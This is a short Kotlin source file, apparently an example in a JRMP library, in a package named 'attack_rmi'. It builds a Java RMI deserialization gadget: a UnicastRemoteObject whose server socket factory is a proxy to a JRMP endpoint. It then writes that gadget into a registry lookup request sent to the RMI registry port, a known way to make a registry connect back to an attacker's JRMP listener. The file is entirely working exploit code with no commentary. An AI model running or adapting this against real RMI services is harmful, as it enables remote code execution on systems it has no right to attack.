package example.attack_rmi

import org.joor.Reflect
import sun.rmi.server.UnicastRef
import sun.rmi.transport.LiveRef
import sun.rmi.transport.tcp.TCPEndpoint
import top.ceclin.jrmp.RegistryV1
import top.ceclin.jrmp.ext.replace
import top.ceclin.jrmp.request.Request
import top.ceclin.jrmp.request.request
import top.ceclin.jrmp.request.singleOp
import java.lang.reflect.Proxy
import java.net.Socket
import java.rmi.Remote
import java.rmi.registry.Registry
import java.rmi.server.ObjID
import java.rmi.server.RMIServerSocketFactory
import java.rmi.server.RemoteObjectInvocationHandler
import java.rmi.server.UnicastRemoteObject

fun main() {
    val host = "127.0.0.1"
    val port = 13567
    val tcpEndpoint = TCPEndpoint(host, port)
    val ref = UnicastRef(LiveRef(ObjID(), tcpEndpoint, false))
    val proxy = Proxy.newProxyInstance(
        RMIServerSocketFactory::class.java.classLoader,
        arrayOf(RMIServerSocketFactory::class.java, Remote::class.java),
        RemoteObjectInvocationHandler(ref),
    )
    val gadget = Reflect.onClass(UnicastRemoteObject::class.java)
        .create()
        .set("ssf", proxy)
        .get<Any>()
    val operation = RegistryV1.lookup {
        replace = false
        writeObject(gadget)
    }
    Socket("127.0.0.1", Registry.REGISTRY_PORT).use {
        it.tcpNoDelay = true
        val request: Request = operation.singleOp().request()
        it.outputStream.write(request.value)
    }
}
